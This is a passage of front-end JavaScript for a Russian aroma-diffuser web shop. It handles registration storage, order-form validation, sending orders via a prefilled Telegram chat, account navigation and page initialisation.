        // Сохраняем пользователя (без пароля в localStorage)
        const userForStorage = {
            id: userId,
            name: name,
            email: email,
            phone: phone,
            registrationDate: user.registrationDate
        };
        
        saveUser(userForStorage);
        currentUser = userForStorage;
        
        closeRegisterModal();
        updateUI();
        showNotification('Регистрация успешна! Добро пожаловать!');
        this.reset();
    });
}

// Форма заказа - ИСПРАВЛЕНО ДЛЯ ОТПРАВКИ В TELEGRAM
const orderForm = document.getElementById('order-form');
if (orderForm) {
    orderForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        // Проверяем, выбран ли хотя бы один аромат
        if (selectedAromas.length === 0) {
            showNotification('Выберите хотя бы один аромат', 'error');
            return;
        }
        
        // Получение данных формы
        const orderData = {
            id: 'ORD-' + Date.now(),
            date: new Date().toISOString(),
            name: document.getElementById('name').value.trim(),
            phone: document.getElementById('phone').value.trim(),
            email: document.getElementById('email').value.trim(),
            address: document.getElementById('address').value.trim(),
            aromas: selectedAromas.map(item => ({
                id: item.aroma.id,
                name: item.aroma.name,
                price: item.aroma.price,
                quantity: item.quantity
            })),
            comment: document.getElementById('comment').value.trim(),
            product: 'Премиум аромадиффузор',
            status: 'Новый'
        };
        
        // Рассчитываем общую сумму
        orderData.totalPrice = selectedAromas.reduce((sum, item) => {
            return sum + (item.aroma.price * item.quantity);
        }, 0);
        
        // Валидация
        if (!orderData.name || !orderData.phone || !orderData.email || !orderData.address) {
            showNotification('Заполните все обязательные поля', 'error');
            return;
        }
        
        // Проверка email
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailRegex.test(orderData.email)) {
            showNotification('Введите корректный email', 'error');
            return;
        }
        
        // Сохраняем заказ в localStorage
        let orders = JSON.parse(localStorage.getItem('nazzrelax_orders') || '[]');
        orders.push(orderData);
        localStorage.setItem('nazzrelax_orders', JSON.stringify(orders));
        
        // Создание сообщения для Telegram
        let message = `🛒 *Новый заказ диффузора NAZZRELAX*\n\n`;
        message += `*Номер заказа:* ${orderData.id}\n`;
        message += `*Товар:* ${orderData.product}\n`;
        message += `*Состав заказа:*\n`;
        
        selectedAromas.forEach(item => {
            message += `  • ${item.aroma.name}: ${item.quantity} шт. x ${item.aroma.price.toLocaleString()} ₽ = ${(item.aroma.price * item.quantity).toLocaleString()} ₽\n`;
        });
        
        message += `\n*Общая сумма:* ${orderData.totalPrice.toLocaleString()} ₽\n\n`;
        message += `*Данные клиента:*\n`;
        message += `Имя: ${orderData.name}\n`;
        message += `Телефон: ${orderData.phone}\n`;
        message += `Email: ${orderData.email}\n`;
        message += `Адрес: ${orderData.address}\n`;
        if (orderData.comment) {
            message += `Комментарий: ${orderData.comment}\n`;
        }
        message += `\n---\n`;
        message += `*Заказ принят:* ${new Date().toLocaleString('ru-RU')}`;
        
        // Отправка в Telegram через tg:// открыть диалог
        // Сначала пробуем через tg://, если не сработает - через https://t.me/
        const telegramUsername = 'order_101';
        const telegramUrl = `https://t.me/${telegramUsername}?text=${encodeURIComponent(message)}`;
        const telegramAppUrl = `tg://resolve?domain=${telegramUsername}&text=${encodeURIComponent(message)}`;
        
        showNotification('Заказ оформлен! Открываем Telegram для подтверждения...');
        
        // Открытие Telegram и сброс формы
        setTimeout(() => {
            // Пробуем открыть через tg:// (работает в мобильных приложениях)
            window.location.href = telegramAppUrl;
            
            // Если через 500мс не сработало, открываем через веб-версию
            setTimeout(() => {
                window.open(telegramUrl, '_blank');
            }, 500);
            
            this.reset();
            
            // Сбрасываем выбранные ароматы
            selectedAromas = [];
            createAromaOptions();
            updateTotalPrice();
            
            // Если пользователь авторизован, предзаполнение формы
            const user = getCurrentUser();
            if (user && !isAdmin(user)) {
                document.getElementById('name').value = user.name;
                document.getElementById('email').value = user.email;
                document.getElementById('phone').value = user.phone || '';
            }
            
            // Прокрутка к форме
            setTimeout(() => {
                document.getElementById('order').scrollIntoView({ behavior: 'smooth' });
            }, 500);
        }, 1500);
    });
}

// ===== НАВИГАЦИЯ =====

// Функция для обработки кликов по ссылкам
function setupNavigation() {
    // Обработка ссылки "Личный кабинет" в шапке
    const accountLink = document.getElementById('account-link');
    if (accountLink) {
        accountLink.addEventListener('click', function(e) {
            e.preventDefault();
            
            if (isLoggedIn()) {
                // Если пользователь авторизован, показываем личный кабинет
                showAccountPage();
                // Обновляем URL без перезагрузки страницы
                window.history.pushState({}, '', '#account');
            } else {
                // Если не авторизован, открываем окно входа
                openLoginModal();
            }
        });
    }
    
    // Обработка ссылки "Личный кабинет" в футере
    const footerAccountLink = document.getElementById('footer-account-link');
    if (footerAccountLink) {
        footerAccountLink.addEventListener('click', function(e) {
            e.preventDefault();
            
            if (isLoggedIn()) {
                // Если пользователь авторизован, показываем личный кабинет
                showAccountPage();
                // Обновляем URL без перезагрузки страницы
                window.history.pushState({}, '', '#account');
            } else {
                // Если не авторизован, открываем окно входа
                openLoginModal();
            }
        });
    }
    
    // Обработка ссылок навигации в личном кабинете
    document.querySelectorAll('.account-nav a').forEach(link => {
        link.addEventListener('click', function(e) {
            if (this.id === 'logout-btn') {
                e.preventDefault();
                logout();
                return;
            }
            
            e.preventDefault();
            
            // Обновление активной ссылки
            document.querySelectorAll('.account-nav a').forEach(l => l.classList.remove('active'));
            this.classList.add('active');
            
            // Отображение соответствующего раздела
            const sectionId = this.getAttribute('data-section');
            if (sectionId) {
                document.querySelectorAll('.account-section').forEach(section => {
                    section.classList.remove('active');
                });
                const targetSection = document.getElementById(sectionId + '-section');
                if (targetSection) {
                    targetSection.classList.add('active');
                }
            }
        });
    });
    
    // Обработка ссылки на главную страницу (логотип)
    const logo = document.querySelector('.logo');
    if (logo) {
        logo.addEventListener('click', function(e) {
            e.preventDefault();
            showMainPage();
            window.history.pushState({}, '', '#home');
        });
    }
    
    // Обработка других ссылок навигации (плавная прокрутка)
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        // Пропускаем уже обработанные ссылки
        if (anchor.id === 'account-link' || 
            anchor.id === 'footer-account-link' ||
            anchor.classList.contains('logo') || 
            anchor.closest('.account-nav')) {
            return;
        }
        
        anchor.addEventListener('click', function(e) {
            const href = this.getAttribute('href');
            
            if (href === '#' || href.startsWith('#modal')) return;
            
            e.preventDefault();
            const targetElement = document.querySelector(href);
            if (targetElement) {
                // Показываем главную страницу перед прокруткой
                showMainPage();
                
                setTimeout(() => {
                    window.scrollTo({
                        top: targetElement.offsetTop - 80,
                        behavior: 'smooth'
                    });
                }, 100);
            }
        });
    });
}

// Обработка кнопки "Назад" в браузере
window.addEventListener('popstate', function() {
    if (window.location.hash === '#account' && isLoggedIn()) {
        showAccountPage();
    } else {
        showMainPage();
    }
});

// ===== ИНИЦИАЛИЗАЦИЯ =====

// Заполнение формы заказа данными пользователя
function prefillOrderForm() {
    const user = getCurrentUser();
    if (user && !isAdmin(user)) {
        const nameInput = document.getElementById('name');
        const emailInput = document.getElementById('email');
        const phoneInput = document.getElementById('phone');
        
        if (nameInput) nameInput.value = user.name || '';
        if (emailInput) emailInput.value = user.email || '';
        if (phoneInput) phoneInput.value = user.phone || '';
    }
}

// Анимации при прокрутке
const observer = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            entry.target.classList.add('fade-in');
        }
    });
}, { threshold: 0.1, rootMargin: '0px 0px -50px 0px' });

// Эффект при прокрутке для шапки
window.addEventListener('scroll', function() {
    const header = document.getElementById('main-header');
    if (header) {
        if (window.scrollY > 50) {
            header.classList.add('scrolled');
        } else {
            header.classList.remove('scrolled');
        }
    }
});

// Инициализация при загрузке страницы
document.addEventListener('DOMContentLoaded', function() {
    // Загрузка изображений
    loadProductImages();
    
    // Создание элементов выбора ароматов
    createAromaOptions();
    
    // Инициализация галереи изображений
    initImageGallery();
    
    // Настройка навигации
    setupNavigation();
    
    // Проверка авторизации и обновление интерфейса
    updateUI();
    
    // Предзаполнение формы заказа
    prefillOrderForm();
    
    // Обновление общей цены
    updateTotalPrice();
    
    // Наблюдатель для анимаций
    document.querySelectorAll('.product-detail, .about-content, .relaxation-grid').forEach(el => {
        if (el) observer.observe(el);
    });
    
    // Переключение между модальными окнами
    const switchToRegister = document.getElementById('switch-to-register');
    const switchToLogin = document.getElementById('switch-to-login');
    
    if (switchToRegister) {
        switchToRegister.addEventListener('click', function(e) {
            e.preventDefault();
            closeLoginModal();
            openRegisterModal();
        });
    }

    if (switchToLogin) {
        switchToLogin.addEventListener('click', function(e) {
            e.preventDefault();
            closeRegisterModal();
            openLoginModal();
        });
    }

    // Закрытие модальных окон
    const loginClose = document.getElementById('login-close');
    const registerClose = document.getElementById('register-close');
    
    if (loginClose) loginClose.addEventListener('click', closeLoginModal);
    if (registerClose) registerClose.addEventListener('click', closeRegisterModal);

    // Закрытие модальных окон кликом снаружи
    window.addEventListener('click', function(e) {
        if (e.target.classList.contains('modal')) {
            e.target.classList.remove('active');
        }
    });
    
    // Обработка хэш-навигации при загрузке страницы
    if (window.location.hash === '#account') {
        if (isLoggedIn()) {
            showAccountPage();
        } else {
            openLoginModal();
        }
    }
    
    // Сохранение профиля
    const profileForm = document.getElementById('profile-form');
    if (profileForm) {
        profileForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const user = getCurrentUser();
            if (!user) return;
            
            const profileName = document.getElementById('profile-name');
            const profilePhone = document.getElementById('profile-phone');
            const profileBirthdate = document.getElementById('profile-birthdate');
            
            if (profileName) user.name = profileName.value.trim();
            if (profilePhone) user.phone = profilePhone.value.trim();
            if (profileBirthdate) user.birthdate = profileBirthdate.value;
            
            saveUser(user);
            updateUI();
            showNotification('Профиль успешно обновлен');
        });
    }
    
    // Добавление адреса
    const addAddressBtn = document.getElementById('add-address-btn');
    if (addAddressBtn) {
        addAddressBtn.addEventListener('click', function() {
            showNotification('Функция добавления адреса в разработке');
        });
    }
});



